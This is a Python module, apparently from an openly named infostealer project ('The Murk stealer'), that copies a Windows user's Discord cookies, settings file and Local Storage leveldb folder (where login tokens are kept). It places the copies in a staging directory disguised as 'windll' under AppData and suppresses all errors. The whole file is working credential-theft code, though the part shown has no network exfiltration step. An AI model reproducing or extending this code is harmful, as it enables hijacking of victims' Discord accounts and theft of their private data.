#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

import os
import shutil
"""
all needed paths
"""
path = r"discord\Network\Cookies"
path1 = r"discord\settings.json"
path2 = r'discord\Local Storage\leveldb'

def Discord():
    try:
        pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
        os.makedirs(rf'{pathtofile}\windll\Discord')
        user = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming'
        shutil.copy2(user+ os.sep + path,rf'{pathtofile}\windll\Discord')# copy data
        shutil.copy2(user+ os.sep + path1,rf'{pathtofile}\windll\Discord')# copy data
        shutil.copytree(user+ os.sep + path2,rf'{pathtofile}\windll\Discord\Local Storage\leveldb')# copy dir
    except:
        pass